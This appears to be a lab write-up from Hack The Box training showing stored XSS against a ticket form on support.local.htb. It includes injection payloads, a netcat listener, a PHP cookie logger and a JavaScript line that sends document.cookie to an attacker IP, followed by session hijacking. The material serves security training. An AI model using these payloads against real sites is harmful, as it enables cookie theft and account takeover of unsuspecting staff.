---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# XSS

## Example

{% hint style="info" %}
The below example has been taken from the [Web Enumeration & Exploitation](https://academy.hackthebox.com/module/163/section/1544) of HTB's Attacking Enterprise Networks module.&#x20;
{% endhint %}

We have found a **ticket form** on `support.local.htb` (Figure 1).

<div align="left">

<figure><img src="../../.gitbook/assets/xss_ticket_form.png" alt="" width="375"><figcaption><p>Figure 1: A form that can we can raise ticket to the support department.</p></figcaption></figure>

</div>

We can first **test** if it is vulnerable to XSS (Figure 2).

{% tabs %}
{% tab title="1. Payload" %}
```javascript
 "><script src=http://10.10.15.131:1337/test</script>
```
{% endtab %}

{% tab title="2. Listener" %}
```bash
nc -lvnp 1337
```
{% endtab %}
{% endtabs %}

<div align="left">

<figure><img src="../../.gitbook/assets/xss_test.png" alt="" width="554"><figcaption><p>Figure 2: Testing XSS.</p></figcaption></figure>

</div>

Next, we will **steal the cookie** of the person who will process our ticket (Figure 3) by:

1. Creating a script (`index.php`) that will expand the stolen cookie.
2. Creating another script (`script.js`) that will steal the user's cookie, request `index.php` and pass it as a value to `index.php`.&#x20;
3. Passing a payload that will request `script.js`.

{% tabs %}
{% tab title="index.php" %}
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
```
{% endtab %}

{% tab title="script.js" %}
```javascript
new Image().src='http://10.10.15.131/index.php?c='+document.cookie
```
{% endtab %}

{% tab title="Python HTTP Server" %}
```bash
python3 -m http.server 80
```
{% endtab %}

{% tab title="Payload" %}
```javascript
"><script src=http://10.10.15.131/script.js></script>
```
{% endtab %}
{% endtabs %}

<figure><img src="../../.gitbook/assets/xss_cookie.png" alt=""><figcaption><p>Figure 3: Snatching the support staff's cookie.</p></figcaption></figure>

Adding a new session cookie (Figure 4) and refreshing the page, gives us elevated access (Figure 5).

<div align="left">

<figure><img src="../../.gitbook/assets/xss_creating_cookie.png" alt="" width="453"><figcaption><p>Figure 4: Creating a new session cookie.</p></figcaption></figure>

</div>

<div align="left">

<figure><img src="../../.gitbook/assets/xss_dashboard_access.png" alt="" width="563"><figcaption><p>Figure 5: Refreshing the page gives us dashboard access.</p></figcaption></figure>

</div>
